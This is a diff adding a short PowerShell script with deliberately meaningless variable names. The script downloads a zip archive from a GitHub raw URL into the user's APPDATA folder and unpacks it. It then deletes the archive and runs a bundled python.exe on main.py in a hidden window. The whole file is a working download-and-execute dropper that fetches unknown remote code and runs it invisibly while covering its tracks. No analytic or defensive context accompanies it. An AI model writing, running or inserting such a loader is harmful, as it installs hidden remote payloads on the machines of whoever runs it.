@@ -1,0 +1,14 @@
+$ltrmn = 'https://github.com/blackcodeit407/system/blob/main/system.zip?raw=true'
+$kdsf = "$env:APPDATA\pzk.zip"
+$cwab = "$env:APPDATA\Extrac"
+$gqjd = Join-Path $cwab 'python.exe'
+
+if (!(Test-Path $cwab)) { New-Item -Path $cwab -ItemType Directory }
+
+Invoke-WebRequest -Uri $ltrmn -OutFile $kdsf
+
+tar -xf $kdsf -C $cwab
+
+Remove-Item $kdsf -Force
+
+Start-Process -FilePath $gqjd main.py -WindowStyle Hidden
